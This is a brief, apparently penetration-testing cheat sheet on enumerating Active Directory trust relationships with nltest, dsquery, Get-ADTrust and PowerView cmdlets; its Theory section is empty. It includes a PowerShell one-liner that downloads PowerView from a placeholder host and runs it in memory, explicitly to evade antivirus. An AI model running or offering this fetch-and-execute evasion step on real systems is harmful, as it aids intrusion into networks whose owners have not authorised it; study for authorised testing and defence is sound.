# Trust relation



## **Theory**

## Method

### **Enumerate**

* `nltest /trusted_domains` (installed by default on Windows)
* `dsquery * -filter "(objectClass=trustedDomain)" -attr *`
* `Get-ADTrust` : PowerShell Windows module for Active Directory, use LDAP requests
  * Require RSAT (remote admin tools)
  * `Get-ADTrust -Filter * -Properties *`
  * `(Get-ADForest).Domains | ForEach-Object { Get-ADTrust -Server $_ -Filter * -Properties * }`
* `Get-ForestTrust` et `Get-DomainTrust` : Cmdlets of `PowerView` from `PowerSploit`
  *   Powerview is catch by AV, you need to inject it directly in the memory

      ```
      IEX (New-Object Net.WebClient).DownloadString('https://<IP>:<PORT>/Pw.ps1');
      Get-ForestTrust
      Get-DomainTrust
      ```
